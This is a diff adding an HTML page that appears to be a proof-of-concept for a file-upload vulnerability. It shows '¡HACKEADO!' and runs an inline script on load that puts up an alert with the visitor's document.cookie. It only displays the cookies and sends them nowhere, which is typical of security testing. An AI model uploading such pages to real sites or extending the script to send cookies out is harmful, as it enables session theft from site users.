@@ -1,0 +1,6 @@
+<html>
+  <body>
+    <h1>¡HACKEADO!</h1>
+    <script>alert('Vulnerabilidad de Subida de Archivos: Cookies robadas: ' + document.cookie);</script>
+  </body>
+</html>
